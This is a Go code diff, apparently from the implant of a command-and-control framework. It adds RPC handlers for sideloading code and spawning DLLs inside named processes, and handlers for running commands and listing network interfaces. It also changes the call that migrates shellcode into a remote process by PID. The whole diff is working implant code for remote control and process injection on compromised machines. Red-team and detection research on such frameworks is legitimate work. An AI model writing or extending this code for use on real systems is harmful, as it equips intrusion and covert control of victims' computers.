@@ -41,6 +41,8 @@ var (
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		pb.MsgMigrateReq:         migrateHandler,
+		pb.MsgSideloadReq:        sideloadHandler,
+		pb.MsgSpawnDllReq:        spawnDllHandler,
 
 		// Generic
 		pb.MsgPsReq:       psHandler,
@@ -52,6 +54,8 @@ var (
 		pb.MsgPwdReq:      pwdHandler,
 		pb.MsgRmReq:       rmHandler,
 		pb.MsgMkdirReq:    mkdirHandler,
+		pb.MsgIfconfigReq: ifconfigHandler,
+		pb.MsgExecuteReq:  executeHandler,
 	}
 )
 
@@ -123,6 +127,9 @@ func elevateHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
+	//{{if .Debug}}
+	log.Println("executeAssemblyHandler called")
+	//{{end}}
 	execReq := &pb.ExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
@@ -157,7 +164,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode)
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode, false)
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
@@ -173,5 +180,57 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 	}
 	data, err = proto.Marshal(migrateResp)
+	resp(data, err)
+}
+
+func sideloadHandler(data []byte, resp RPCResponse) {
+	//{{if .Debug}}
+	log.Println("sideloadHandler called")
+	//{{end}}
+	sideloadReq := &pb.SideloadReq{}
+	err := proto.Unmarshal(data, sideloadReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	result, err := taskrunner.Sideload(sideloadReq.ProcName, sideloadReq.Data)
+	errStr := ""
+	if err != nil {
+		errStr = err.Error()
+	}
+	sideloadResp := &pb.Sideload{
+		Result: result,
+		Error:  errStr,
+	}
+	data, err = proto.Marshal(sideloadResp)
+	resp(data, err)
+
+}
+
+func spawnDllHandler(data []byte, resp RPCResponse) {
+	spawnReq := &pb.SpawnDllReq{}
+	err := proto.Unmarshal(data, spawnReq)
+
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	//{{if .Debug}}
+	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
+	//{{end}}
+	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
+	errStr := ""
+	if err != nil {
+		errStr = err.Error()
+	}
+	spawnResp := &pb.SpawnDll{
+		Result: result,
+		Error:  errStr,
+	}
+	data, err = proto.Marshal(spawnResp)
 	resp(data, err)
 }
